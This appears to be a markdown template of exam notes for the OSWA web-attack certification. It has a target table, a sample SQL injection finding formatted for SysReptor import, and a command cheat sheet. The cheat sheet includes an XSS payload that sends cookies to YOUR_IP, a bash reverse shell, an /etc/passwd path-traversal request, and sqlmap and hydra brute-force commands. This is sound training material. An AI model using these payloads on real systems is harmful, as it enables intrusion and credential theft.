# OSWA Exam Notes

`{{date}}` · `{{time_start}}` – `{{time_end}}`

## Targets

| IP | Hostname | Ports Open | Notes |
|---|---|---|---|
| 192.168.x.x | — | 80,443 | |

## Findings

> Format each finding with mdfindings2reptor headers so you can bulk-import to SysReptor after hacking.

```
# Title
SQLi in /login.php

# Summary
Authentication bypass via SQL injection in login form.

# Impact
Unauthenticated access to admin panel, user data exposure.

# Recommendation
Use parameterized queries / prepared statements.

# Affected components
* http://192.168.x.x:80/login.php

# References
* https://owasp.org/www-community/attacks/SQL_Injection

# Description
POST /login.php HTTP/1.1
user=admin'--&pass=x

Screenshot: [local.txt flag contents]
```

## Commands

```bash
# Recon
~/Projects/OSWA/recon-scan recon host1,host2,host3,host4,host5
feroxbuster -u http://TARGET --thorough -C 404 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox-scan
cewler -d 3 -m 3 -o cewler.txt http://TARGET

# SQLi
sqlmap -u "http://$IP/page.php?id=1" --batch --dbs

# XSS
<script>fetch('http://YOUR_IP/'+document.cookie)</script>

# LFI/RFI
curl "http://$IP/page.php?file=../../../../etc/passwd"

# Reverse shell
nc -lvnp 4444
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# File transfer (target → you)
python3 -m http.server 8000

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

## SysReptor Import

```bash
# After exam: split findings from notes, convert to JSON, push to SysReptor
python3 split_findings.py oswa-exam-notes.md
python3 ~/tools/mdfindings2reptor/mdfindings2reptor.py findings/ --aggregate-only --recurse
cat aggregated_findings.json | reptor finding
```
